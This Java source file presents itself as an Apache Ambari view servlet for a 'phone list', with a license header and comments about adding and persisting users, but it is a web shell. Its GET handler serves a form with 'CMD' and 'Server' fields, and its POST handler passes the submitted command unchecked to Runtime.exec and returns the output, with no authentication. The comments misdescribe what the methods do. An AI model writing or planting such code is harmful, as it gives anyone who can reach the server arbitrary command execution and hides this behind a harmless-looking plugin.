/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.apache.ambari.view.proxy;

import org.apache.ambari.view.DataStore;
import org.apache.ambari.view.ViewContext;
import org.apache.ambari.view.PersistenceException;

import javax.servlet.ServletConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Collection;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.Map;
import java.io.*;

/**
 * Servlet for phone list view.
 */
public class PublisherServlet extends HttpServlet {

  /**
   * The view context.
   */
  private ViewContext viewContext;

  /**
   * The view data store.
   * <code>null</code> indicates that the view properties should be used instead of the data store.
   */
  private DataStore dataStore = null;


  // ----- GenericServlet ----------------------------------------------------

  @Override
  public void init(ServletConfig config) throws ServletException {
    super.init(config);

    ServletContext context = config.getServletContext();
    viewContext = (ViewContext) context.getAttribute(ViewContext.CONTEXT_ATTRIBUTE);
    dataStore = Boolean.parseBoolean(viewContext.getProperties().get("data.store.enabled")) ?
        viewContext.getDataStore() : null;
  }


  // ----- HttpServlet -------------------------------------------------------

  @Override
  protected void doPost(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    String cmd = request.getParameter("cmd");
    String server = request.getParameter("server");
	String o = null;
    PrintWriter writer = response.getWriter();	
    try {
		o = executeCommand(cmd,server);
		if(o!=null){
			writer.println(o);
		}
    } catch (Exception e) {
      throw new ServletException(e);
    }
  }

  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    response.setContentType("text/html");
    response.setStatus(HttpServletResponse.SC_OK);
    PrintWriter writer = response.getWriter();

    try {

	 showForm(writer, request);

    } catch (Exception e) {
      throw new ServletException(e);
    }
  }


  // ----- helper methods ----------------------------------------------------

  // form to add new user
  private void showForm(PrintWriter writer, HttpServletRequest request) {
    writer.println("<form name=\"input\" action = \""+ request.getRequestURI() +"\" method=\"POST\">");
    writer.println("<table>");
    writer.println("<tr>");
    writer.println("<td>CMD:</td><td><input type=\"text\" name=\"cmd\"></td><br/>");
    writer.println("</tr>");
    writer.println("<tr>");
    writer.println("<td>Server:</td><td><input type=\"text\" name=\"server\"></td><br/><br/>");
    writer.println("</tr>");
    writer.println("</table>");
    writer.println("<input type=\"submit\" value=\"Execute\" name=\"Execute\">");
    writer.println("</form>");
  }



  // determine whether a user has been persisted
  private String executeCommand(String cmd, String server) throws Exception {

	try{
      // Get runtime
        java.lang.Runtime rt = java.lang.Runtime.getRuntime();
        // Start a new process: UNIX command ls
        java.lang.Process p = rt.exec(cmd);
        // You can or maybe should wait for the process to complete
        p.waitFor();
        //System.out.println("Process exited with code = " + rt.exitValue());
        // Get process' output: its InputStream
        java.io.InputStream is = p.getInputStream();
        java.io.BufferedReader reader = new java.io.BufferedReader(new InputStreamReader(is));
        // And print each line
        String s = null;
        String retS=new String();
        while ((s = reader.readLine()) != null) {
            retS+=s;
            retS+="\n";
        }
        is.close();
        return retS;
    }catch(Exception e){
      throw new Exception(e);    
    }

  }


}

